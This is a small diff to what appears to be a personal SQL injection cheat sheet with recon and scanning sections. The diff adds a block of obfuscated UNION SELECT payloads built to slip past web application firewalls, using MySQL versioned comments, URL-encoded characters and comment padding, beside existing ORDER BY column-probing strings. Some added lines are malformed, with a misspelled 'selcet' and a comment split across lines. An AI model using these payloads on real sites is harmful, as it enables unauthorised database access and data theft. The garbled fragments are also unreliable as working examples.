@@ -3,8 +3,7 @@
 - [recon step 1 ](#recon)
 - 
 - [automatic scan](#automatic).
-
--- [sql scan  ](#SqlScan )
+ --[sql scan  ](#SqlScan )
 
 
 
@@ -162,6 +161,14 @@ ORDER BY 1,2,3,4,5,6,7,8,9
 %2f**%2fORDER%2f**%2fBY%2f**%2f100
 ```
 >next union
+```
+union selcet 
+AND+0+/*!50000%55NI\ON*/+/*!
+50000%53ELE\CT/**_**/*/
+
+%23%0A/*!50000union/**_**/*/
+%23%0AdistinctROW/**_**/
+%23%0ASelect%23%0A
 ```
 
 
